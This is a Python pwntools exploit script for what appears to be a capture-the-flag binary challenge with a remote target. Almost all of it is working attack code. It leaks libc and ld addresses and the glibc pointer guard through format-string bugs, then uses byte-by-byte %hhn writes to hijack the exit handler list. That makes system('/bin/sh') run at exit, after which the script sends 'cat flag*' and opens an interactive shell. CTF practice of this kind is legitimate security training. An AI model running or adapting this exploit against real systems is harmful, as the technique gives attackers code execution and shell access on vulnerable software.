#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '27.112.79.222', 7013

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x1294
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def fuzz():
    context.log_level = 'warning'

    for i in range(1, 40):
        io = initialize()

        io.sendlineafter(b'...?', f'BBBBAAAAAAAA||%{i}$p'.encode())
        io.recvuntil(b'but ')
        leak = io.recvline().strip().decode()
        log.warning(f'{i}: {leak}')

        io.close()

def write_byte(addr, val):
    if val == 0x0:
        log.info('skipping null byte')
        return

    payload = (f'%{val}c'.encode() + b'%11$hhn').ljust(12, b'\x00') + p64(addr)
    assert len(payload) <= 21
    io.sendafter(b'...?', payload)
    log.info('written %#x(%d) to %#x', val, len(payload), addr)

def write_qword(addr, val):
    for i in range(8):
        write_byte(addr+i, (val >> i*8) & 0xff)

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

# encrypt a function pointer
def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

stack = 0x0
ptr_guard = 0x0
ptr_guard_addr = 0x0
def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'...?', b'%3$p')
    io.recvuntil(b'but 0x')
    libc.address = int(io.recvline().strip(), 16) - 0x114887
    fp = libc.address + 0x1ff7a0 # _IO_2_1_stdout_
    system = libc.address + 0x50d70
    malloc_hook = libc.address + 0x2214a0
    __run_exit_handlers = libc.address + 0x45390
    initial = libc.address + 0x21bf00
    initial_func = initial + 0x18

    io.sendlineafter(b'...?', b'%38$p')
    io.recvuntil(b'but 0x')
    ld = int(io.recvline().strip(), 16) - 0x3b2e0
    # ptr_guard_addr = ld - 0x4890 # local
    ptr_guard_addr = libc.address - 0x2890 # remote

    payload = b'%11$s'.ljust(12, b'\x00') + p64(ptr_guard_addr)
    io.sendafter(b'...?', payload)
    io.recvuntil(b'but ')
    ptr_guard = u64(io.recv(8))

    write_qword(malloc_hook, u64(b'/bin/sh\x00'))
    write_qword(initial_func+8, malloc_hook)
    write_qword(initial_func, encrypt(system, ptr_guard))

    sleep(1) 
    io.sendline(b'surely') # trigger exit

    sleep(1)
    io.sendline(b'cat flag*')

    log.success('libc base: %#x', libc.address)
    log.success('ld base: %#x', ld)
    log.success('ptr guard @ %#x', ptr_guard_addr)
    log.success('ptr guard: %#x', ptr_guard)
    log.success('initial: %#x', initial)
    log.success('call rax: %#x', libc.address + 0x45493)
    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()
